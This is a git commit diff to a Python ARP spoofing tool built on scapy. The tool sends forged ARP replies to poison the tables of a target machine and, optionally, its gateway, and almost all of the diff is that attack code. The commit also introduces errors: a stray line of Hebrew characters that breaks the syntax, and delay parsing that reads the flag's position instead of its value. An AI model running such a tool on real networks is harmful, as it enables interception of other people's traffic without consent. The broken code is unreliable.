dc27f7e9436df49c83ae4d257cc064931b6e4fea
shoham-z <shozeh123@gmail.com>
2022-11-23 13:41:48 +0200

    some changes

--- main.py
+++ main.py
@@ -3,20 +3,25 @@ import sys
 import time
 
 # to run in linux:
+דם# install scapy globally
 # sudo python3 main.py [args]
 
 target_mac = ""
-target_ip = "192.168.1.135"  # Enter your target IP
-spoof_ip = "192.168.1.1"  # Enter your gateway's IP
+target_ip = ""
+spoof_ip = ""
 attack_gw = False
 interface = None
 delay = 2
+help_msg = "usage:\n     python ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET\n\nSpoof ARP " \
+           "tables\noptional arguments:\n -h, --help                      show this help message and exit\n -i IFACE, " \
+           "--iface IFACE        Interface you wish to use\n -s SRC, --src SRC              The address you want for " \
+           "the attacker\n -d DELAY, --delay DELAY        Delay (in seconds) between messages\n -gw                   " \
+           "         should GW be attacked as well\n -t TARGET, --target TARGET     IP of target "
 
 
 def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast / arp_request
+    arp_request_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
+    answered_list = []
     try:
         if interface is not None:
             answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False, interface=interface)[0]
@@ -40,7 +45,6 @@ def spoof(target_ip, spoof_ip):
             scapy.send(packet, verbose=False)
     except:
         print("interface is unavailable")
-    scapy.send(packet, verbose=False)
 
 
 def main():
@@ -52,7 +56,7 @@ def main():
                 spoof(spoof_ip, target_ip)
             sent_packets_count = sent_packets_count + 1
             print("\r[*] Packets Sent " + str(sent_packets_count), end="")
-            time.sleep(delay)  # Waits for two seconds
+            time.sleep(delay)
 
     except KeyboardInterrupt:
         print("\nCtrl + C pressed.............Exiting")
@@ -62,44 +66,30 @@ def main():
 if __name__ == "__main__":
     if len(sys.argv) > 1:
         if sys.argv[1] == "-h" or sys.argv[1] == "--help":
-            print("usage:\n     python ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET")
-            print("\nSpoof ARP tables\noptional arguments:")
-            print("-h, --help                      show this help message and exit")
-            print(" -i IFACE, --iface IFACE        Interface you wish to use")
-            print(" -s SRC, --src SRC              The address you want for the attacker")
-            print(" -d DELAY, --delay DELAY        Delay (in seconds) between messages")
-            print(" -gw                            should GW be attacked as well")
-            print(" -t TARGET, --target TARGET     IP of target")
+            print(help_msg)
             exit()
         if "-gw" in sys.argv:
             attack_gw = True
         if "-t" in sys.argv or "--target" in sys.argv:
-            index = -1
-            if "-t" in sys.argv:
-                index = sys.argv.index("-t")
-            else:
-                index = sys.argv.index("--target")
-            target_ip = sys.argv[index + 1]
+            try:
+                target_ip = sys.argv[sys.argv.index("-t") + 1]
+            except:
+                target_ip = sys.argv[sys.argv.index("--target") + 1]
         if "-d" in sys.argv or "--delay" in sys.argv:
-            index = -1
-            if "-d" in sys.argv:
-                index = sys.argv.index("-d")
-            else:
-                index = sys.argv.index("--delay")
-            delay = int(sys.argv[index + 1])
+            try:
+                delay = int(sys.argv.index("-d"))
+            except:
+                delay = int(sys.argv.index("--delay"))
         if "-s" in sys.argv or "--src" in sys.argv:
-            index = -1
-            if "-s" in sys.argv:
-                index = sys.argv.index("-s")
-            else:
-                index = sys.argv.index("--src")
-            spoof_ip = sys.argv[index + 1]
+            try:
+                spoof_ip = sys.argv[sys.argv.index("-s") + 1]
+            except:
+                spoof_ip = sys.argv[sys.argv.index("--src") + 1]
         if "-i" in sys.argv or "--iface" in sys.argv:
-            index = -1
-            if "-i" in sys.argv:
-                index = sys.argv.index("-i")
-            else:
-                index = sys.argv.index("--iface")
-            interface = sys.argv[index + 1]
+            try:
+                interface = sys.argv[sys.argv.index("-i") + 1]
+            except:
+                interface = sys.argv[sys.argv.index("--iface") + 1]
+
 
     main()
